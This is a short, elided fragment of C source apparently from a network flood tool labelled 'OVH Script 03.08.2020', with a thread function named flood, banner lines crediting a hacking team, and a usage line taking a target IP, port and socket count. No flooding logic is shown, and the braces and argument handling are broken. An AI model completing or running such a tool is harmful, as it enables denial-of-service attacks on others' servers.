...
void *flood(void *par1)
{
    ...
    {
    printf(KGREEN "OVH Script 03.08.2020 '\n" RESET);
    printf(KGREEN "you do not come to us with what you have received from us'\n" RESET);
  printf(KGREEN "Coded by Lemı//ADRIA TEAM'\n" RESET);
  printf(KGREEN "Have fun'\n" RESET);
      if(argc < 5 || argc > 5){
      fprintf(stdout, "example: %s <IP> <Port> <Socket> <other>\n", argv[0]);
